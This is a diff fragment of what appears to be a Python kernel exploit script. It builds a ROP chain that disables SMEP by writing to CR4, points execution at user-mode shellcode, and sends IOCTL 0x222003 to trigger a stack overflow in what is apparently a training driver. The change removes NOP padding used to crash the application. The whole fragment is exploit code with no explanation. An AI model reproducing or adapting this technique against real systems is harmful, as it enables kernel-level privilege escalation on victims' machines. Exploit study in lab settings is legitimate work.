@@ -392,9 +392,6 @@ input_buffer += struct.pack('<Q', kernel_address + 0x108552)    # mov cr4, rcx ;
 print "[+] SMEP disabled!"
 input_buffer += struct.pack('<Q', ptr)                          # Location of user mode shellcode
 
-# Crash the application
-input_buffer += "\x90" * (4000 - len(input_buffer))
-
 input_buffer_length = len(input_buffer)
 
 # 0x222003 = IOCTL code that will jump to TriggerStackOverflow() function
